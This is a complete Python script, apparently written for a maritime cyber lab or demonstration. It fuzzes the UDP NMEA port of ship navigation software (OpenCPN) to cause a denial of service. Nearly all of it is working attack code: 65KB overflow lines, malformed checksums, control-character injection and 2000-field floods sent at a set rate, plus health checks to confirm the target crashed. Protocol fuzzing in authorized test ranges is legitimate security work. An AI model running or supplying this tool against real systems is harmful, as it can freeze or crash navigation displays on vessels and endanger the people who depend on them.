#!/usr/bin/env python3
"""
NMEA Protocol Fuzzer - Enhanced Version
Attack Type: Application-layer DoS via Malformed NMEA Sentences

Fuzzing Techniques:
1. Line Length Overflow    - 65KB payload (parser crash)
2. Malformed Checksum      - Invalid checksum format
3. Control Character Injection - Null bytes, control chars
4. Field Explosion         - 2000+ fields (memory exhaustion)

⚠️ IMPORTANT - Success Detection Limitations:
This fuzzer uses UDP (connectionless protocol). The fuzzer CANNOT reliably
detect if the target crashed because UDP has no response mechanism.

"Health check" is included but has limited reliability - it only confirms
that packets can be SENT, not that they are RECEIVED or PROCESSED.

✅ Proper Success Detection (Manual Verification Required):
1. Bridge Zone (A) Observation:
   - OpenCPN UI freeze/crash
   - NMEA listener process stops responding
   - System CPU/Memory spike
   - Process log output stops

2. Integration Zone (B) Detection:
   - Suricata IDS alerts for malformed NMEA packets
   - Network anomaly detection triggers

3. Optional HTTP Health Endpoint:
   - Deploy simple HTTP server on Bridge (e.g., /health endpoint)
   - Fuzzer queries HTTP to verify target is alive
   - More reliable than UDP-only approach

📋 Success Checklist (for demonstration):
[ ] Target system shows high CPU/memory usage
[ ] Target application (OpenCPN) becomes unresponsive
[ ] Target logs show parsing errors
[ ] IDS (Suricata) detects malformed packets
[ ] HTTP health endpoint stops responding (if deployed)
"""

import socket
import random
import time
import string
import argparse
import sys
from datetime import datetime

class NMEAFuzzer:
    def __init__(self, host, port, health_check_interval=10, health_url=None):
        """
        Initialize NMEA Protocol Fuzzer

        Args:
            host: Target IP address
            port: Target UDP port
            health_check_interval: Seconds between health checks
            health_url: Optional HTTP health endpoint (e.g., http://10.10.10.10:8080/health)
        """
        self.host = host
        self.port = port
        self.health_check_interval = health_check_interval
        self.health_url = health_url
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Statistics
        self.stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'overflow_count': 0,
            'checksum_count': 0,
            'control_count': 0,
            'explosion_count': 0,
            'health_checks': 0,
            'health_failures': 0,
            'start_time': None
        }

        # Health check
        self.last_health_check = 0
        self.target_status = "UNKNOWN"  # UNKNOWN, SENDING, UNCONFIRMED

    def random_ascii(self, n):
        """Generate random ASCII string"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

    def calculate_checksum(self, sentence):
        """Calculate NMEA checksum"""
        checksum = 0
        for char in sentence:
            checksum ^= ord(char)
        return f"{checksum:02X}"

    def fuzz_overflow(self):
        """
        Line Length Overflow Attack
        Normal NMEA max: 82 chars
        Attack: 65000 chars
        """
        payload = self.random_ascii(65000)
        sentence = f"GPRMC,{payload}"
        checksum = self.calculate_checksum(sentence)
        packet = f"${sentence}*{checksum}\r\n"
        self.stats['overflow_count'] += 1
        return packet.encode(errors="ignore")

    def fuzz_checksum(self):
        """
        Malformed Checksum Attack
        Replace checksum with invalid characters
        """
        payload = self.random_ascii(200)
        sentence = f"GPRMC,{payload}"
        # Invalid checksum format
        invalid_checksum = random.choice(["@@@", "ZZZ", "***", "~~~", "\x00\xff"])
        packet = f"${sentence}*{invalid_checksum}\r\n"
        self.stats['checksum_count'] += 1
        return packet.encode(errors="ignore")

    def fuzz_control_chars(self):
        """
        Control Character Injection
        Inject null bytes, escape chars, etc.
        """
        control_chars = ['\x00', '\xff', '\x1b', '\x7f', '\r', '\n', '\t']
        payload_parts = [
            "A", "B", "C",
            random.choice(control_chars),
            random.choice(control_chars),
            self.random_ascii(100)
        ]
        payload = ",".join(payload_parts)
        sentence = f"GPRMC,{payload}"
        checksum = "00"  # Invalid but formatted
        packet = f"${sentence}*{checksum}\r\n"
        self.stats['control_count'] += 1
        return packet.encode(errors="ignore")

    def fuzz_explosion(self):
        """
        Field Explosion Attack
        Normal NMEA: ~15 fields max
        Attack: 2000+ fields
        """
        fields = ",".join(["1234"] * 2000)
        sentence = f"GPRMC,{fields}"
        checksum = "00"
        packet = f"${sentence}*{checksum}\r\n"
        self.stats['explosion_count'] += 1
        return packet.encode(errors="ignore")

    def send_health_check(self):
        """
        Check if target is alive

        ⚠️ UDP-only mode: Can only confirm packets are SENT, not received/processed
        ✅ HTTP mode: Can reliably check if target endpoint responds

        Returns: Status string (SENDING, UNCONFIRMED, HTTP_ALIVE, HTTP_DEAD)
        """
        self.stats['health_checks'] += 1

        # If HTTP health endpoint is configured, use that (reliable)
        if self.health_url:
            try:
                import urllib.request
                response = urllib.request.urlopen(self.health_url, timeout=2)
                if response.status == 200:
                    return "HTTP_ALIVE"
                else:
                    self.stats['health_failures'] += 1
                    return "HTTP_DEAD"
            except Exception as e:
                self.stats['health_failures'] += 1
                return "HTTP_DEAD"

        # UDP-only mode: Just send valid NMEA packet
        # ⚠️ This does NOT confirm target is alive, only that we can send
        else:
            valid_sentence = "GPGGA,123519,3506.6500,N,12907.1400,E,1,08,0.9,545.4,M,46.9,M,,"
            checksum = self.calculate_checksum(valid_sentence)
            packet = f"${valid_sentence}*{checksum}\r\n"

            try:
                self.sock.sendto(packet.encode(), (self.host, self.port))
                # UDP has no way to confirm delivery
                return "SENDING"
            except Exception as e:
                self.stats['health_failures'] += 1
                return "UNCONFIRMED"

    def get_fuzz_function(self, mode):
        """Get fuzzing function by mode"""
        modes = {
            'overflow': self.fuzz_overflow,
            'checksum': self.fuzz_checksum,
            'control': self.fuzz_control_chars,
            'explosion': self.fuzz_explosion
        }
        return modes.get(mode)

    def show_stats_inline(self):
        """Show inline statistics (single line, updates in place)"""
        elapsed = time.time() - self.stats['start_time']
        pps = self.stats['total_packets'] / elapsed if elapsed > 0 else 0
        bps = self.stats['total_bytes'] / elapsed if elapsed > 0 else 0

        # Status indicator (honest labels)
        status_icons = {
            "HTTP_ALIVE": "🟢 HTTP:OK",
            "HTTP_DEAD": "🔴 HTTP:DOWN",
            "SENDING": "🟡 UDP:SENDING",
            "UNCONFIRMED": "⚪ UDP:UNKNOWN",
            "UNKNOWN": "⚪ UNKNOWN"
        }
        status = status_icons.get(self.target_status, "⚪ UNKNOWN")

        stats_line = (
            f"\r[{status}] "
            f"Packets: {self.stats['total_packets']:,} | "
            f"Rate: {pps:.1f} pps, {bps/1024:.1f} KB/s | "
            f"Health: {self.stats['health_checks']}/{self.stats['health_failures']} | "
            f"Time: {int(elapsed)}s"
        )

        print(stats_line, end='', flush=True)

    def show_stats_final(self):
        """Show final detailed statistics"""
        elapsed = time.time() - self.stats['start_time']

        print("\n\n" + "="*70)
        print("NMEA Fuzzing Attack - Final Statistics")
        print("="*70)
        print(f"Target:              {self.host}:{self.port}")
        print(f"Duration:            {elapsed:.2f} seconds")
        print(f"Total Packets Sent:  {self.stats['total_packets']:,}")
        print(f"Total Bytes Sent:    {self.stats['total_bytes']:,} ({self.stats['total_bytes']/1024/1024:.2f} MB)")
        print(f"Average Rate:        {self.stats['total_packets']/elapsed:.1f} packets/sec")
        print(f"                     {self.stats['total_bytes']/elapsed/1024:.1f} KB/sec")
        print()
        print("Attack Breakdown:")
        print(f"  Overflow attacks:  {self.stats['overflow_count']:,}")
        print(f"  Checksum attacks:  {self.stats['checksum_count']:,}")
        print(f"  Control attacks:   {self.stats['control_count']:,}")
        print(f"  Explosion attacks: {self.stats['explosion_count']:,}")
        print()
        print("Health Check:")
        print(f"  Mode:              {'HTTP endpoint' if self.health_url else 'UDP-only (unreliable)'}")
        print(f"  Total checks:      {self.stats['health_checks']}")
        print(f"  Failures:          {self.stats['health_failures']}")
        print(f"  Final status:      {self.target_status}")

        # Honest conclusion based on mode
        print()
        print("="*70)
        if self.health_url:
            # HTTP mode - reliable
            if self.target_status == "HTTP_DEAD":
                print("🔴 HTTP endpoint NOT responding - target likely crashed/hung")
            elif self.target_status == "HTTP_ALIVE":
                print("🟢 HTTP endpoint still responding - target survived attack")
        else:
            # UDP mode - unreliable
            print("⚠️  UDP-only mode: Cannot reliably confirm target status")
            print()
            print("📋 Manual Verification Required:")
            print("   [ ] Check Bridge Zone (A) - OpenCPN UI responsive?")
            print("   [ ] Check Bridge Zone (A) - Process CPU/Memory normal?")
            print("   [ ] Check Bridge Zone (A) - Logs show parsing errors?")
            print("   [ ] Check Integration Zone (B) - Suricata alerts?")
            print("   [ ] Check target process - still running?")

        print("="*70)

    def attack(self, mode='random', duration=60, interval=0.05):
        """
        Execute fuzzing attack

        Args:
            mode: Attack mode (overflow, checksum, control, explosion, random)
            duration: Attack duration in seconds
            interval: Interval between packets in seconds
        """
        print("="*70)
        print("NMEA Protocol Fuzzer - Attack Starting")
        print("="*70)
        print(f"Target:       {self.host}:{self.port}")
        print(f"Mode:         {mode}")
        print(f"Duration:     {duration} seconds")
        print(f"Interval:     {interval} seconds ({1/interval:.1f} packets/sec max)")
        print(f"Health Check: Every {self.health_check_interval} seconds")
        print("="*70)
        print()

        self.stats['start_time'] = time.time()
        start_time = self.stats['start_time']

        # Fuzzing function selection
        if mode == 'random':
            fuzz_functions = [
                self.fuzz_overflow,
                self.fuzz_checksum,
                self.fuzz_control_chars,
                self.fuzz_explosion
            ]
        else:
            fuzz_func = self.get_fuzz_function(mode)
            if not fuzz_func:
                print(f"[!] Invalid mode: {mode}")
                return
            fuzz_functions = [fuzz_func]

        try:
            while (time.time() - start_time) < duration:
                # Select fuzzing function
                fuzz_func = random.choice(fuzz_functions)

                # Generate and send malformed packet
                packet = fuzz_func()
                self.sock.sendto(packet, (self.host, self.port))

                # Update statistics
                self.stats['total_packets'] += 1
                self.stats['total_bytes'] += len(packet)

                # Health check (periodic)
                if time.time() - self.last_health_check >= self.health_check_interval:
                    self.target_status = self.send_health_check()
                    self.last_health_check = time.time()

                # Show inline stats
                self.show_stats_inline()

                # Wait
                time.sleep(interval)

        except KeyboardInterrupt:
            print("\n\n[*] Attack interrupted by user")
        except Exception as e:
            print(f"\n\n[!] Error during attack: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # Final health check
            print("\n\n[*] Performing final health check...")
            self.target_status = self.send_health_check()

            # Show final statistics
            self.show_stats_final()

            # Cleanup
            self.sock.close()


def main():
    parser = argparse.ArgumentParser(
        description='NMEA Protocol Fuzzer - Application-layer DoS Attack',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Fuzzing Modes:
  overflow   - Send 65KB payloads to overflow parser buffers
  checksum   - Send malformed checksum formats
  control    - Inject control characters (null bytes, escape chars)
  explosion  - Send 2000+ fields to exhaust memory
  random     - Randomly mix all attack types

Examples:
  # Random fuzzing for 60 seconds
  python3 nmea_fuzzer.py --host 10.10.10.10 --attack random --duration 60

  # Overflow attack only, high speed
  python3 nmea_fuzzer.py --host 10.10.10.10 --attack overflow --duration 30 --interval 0.01

  # Field explosion attack, slow rate
  python3 nmea_fuzzer.py --host 10.10.10.10 --attack explosion --duration 120 --interval 0.1

  # All attacks with health monitoring
  python3 nmea_fuzzer.py --host 10.10.10.10 --attack random --duration 300 --health-check 5

⚠️ Success Detection Limitations (UDP Protocol):
  This fuzzer uses UDP which has NO built-in response mechanism.
  The fuzzer CANNOT automatically detect if the target crashed.

✅ Reliable Success Detection Methods:
  1. HTTP Health Endpoint (Recommended):
     - Deploy HTTP server on Bridge Zone (e.g., python3 -m http.server 8080)
     - Use --health-url http://10.10.10.10:8080/
     - Fuzzer can reliably detect if endpoint stops responding

  2. Manual Observation (Required for UDP-only):
     [ ] Bridge Zone (A): OpenCPN UI freeze/crash
     [ ] Bridge Zone (A): Process CPU/Memory spike
     [ ] Bridge Zone (A): Logs show parsing errors
     [ ] Integration Zone (B): Suricata IDS alerts
     [ ] Bridge Zone (A): Process still running? (ps aux | grep OpenCPN)

  3. Integration Zone Detection:
     - Suricata should alert on malformed NMEA packets
     - Check IDS logs for protocol violations

Examples with HTTP health check:
  python3 nmea_fuzzer.py --host 10.10.10.10 --attack random \\
    --health-url http://10.10.10.10:8080/

⚠️  WARNING: Use only in authorized test environments!
        """)

    parser.add_argument('--host', default='10.10.10.10',
                       help='Target IP address (default: 10.10.10.10 - Bridge Zone)')
    parser.add_argument('--port', type=int, default=10110,
                       help='Target UDP port (default: 10110 - NMEA port)')
    parser.add_argument('--attack',
                       choices=['overflow', 'checksum', 'control', 'explosion', 'random'],
                       default='random',
                       help='Attack mode (default: random)')
    parser.add_argument('--duration', type=int, default=60,
                       help='Attack duration in seconds (default: 60)')
    parser.add_argument('--interval', type=float, default=0.05,
                       help='Interval between packets in seconds (default: 0.05 = 20 pps)')
    parser.add_argument('--health-check', type=int, default=10,
                       help='Health check interval in seconds (default: 10)')
    parser.add_argument('--health-url', default=None,
                       help='Optional HTTP health endpoint (e.g., http://10.10.10.10:8080/health)')

    args = parser.parse_args()

    # Create fuzzer instance
    fuzzer = NMEAFuzzer(args.host, args.port, args.health_check, args.health_url)

    # Execute attack
    fuzzer.attack(
        mode=args.attack,
        duration=args.duration,
        interval=args.interval
    )


if __name__ == "__main__":
    main()
